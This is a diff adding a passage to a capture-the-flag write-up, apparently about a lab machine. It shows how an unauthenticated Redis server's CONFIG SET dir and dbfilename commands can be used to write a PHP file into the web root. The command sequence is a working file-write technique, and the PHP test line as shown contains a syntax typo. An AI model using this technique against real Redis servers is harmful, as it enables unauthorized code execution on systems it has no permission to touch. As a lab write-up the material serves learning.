@@ -225,5 +225,25 @@ cluster_enabled:0
 # Keyspace
 ```
 
+After some research on Redis commands I was able to find `CONFIG GET *`. <br/>
+This command basically outputs the whole configuration of the database management system. <br/>
+What is interesting for us though is that redis is operating in the root direcotry.
+```sh
+251) "dir"
+252) "/"
+```
 
+After some more research I found that we can change the working direcotry and create files, so let's try that:
+```sh
+10.10.57.136:6379[1]> config set dir /var/www/html
+OK
+10.10.57.136:6379[1]> config set dbfilename test.php
+OK
+10.10.57.136:6379[1]> set test "<?php phpinfo((; ?>"
+OK
+10.10.57.136:6379[1]> save
+OK
+```
 
+After taking a look at the website I was able to find the page with phpinfo() loaded:
+![grafik](https://github.com/Aryt3/writeups/assets/110562298/e69b5d1c-f9a8-48a2-9d11-212851c4e5be)
